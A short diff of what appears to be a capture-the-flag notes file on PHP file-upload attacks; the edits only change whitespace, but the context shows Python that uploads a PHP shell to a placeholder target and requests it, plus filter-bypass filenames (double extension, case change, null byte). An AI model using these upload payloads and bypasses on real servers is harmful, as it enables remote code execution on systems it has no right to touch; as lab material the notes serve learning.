@@ -38,7 +38,7 @@ tricks:
       php_code = '<?php echo getenv("FLAG"); ?>'
       files = {'userfile': ('shell.php', php_code, 'application/x-php')}
       requests.post('http://TARGET/index.php', files=files, data={'submit': 'Upload Image'})
-      
+
       resp = requests.get('http://TARGET/upload/shell.php')
       # FLAG{...}
 
@@ -56,4 +56,3 @@ tricks:
       shell.php.jpg      # Double extension
       shell.PHP          # Case bypass
       shell.php%00.jpg   # Null byte (PHP < 5.3)
-
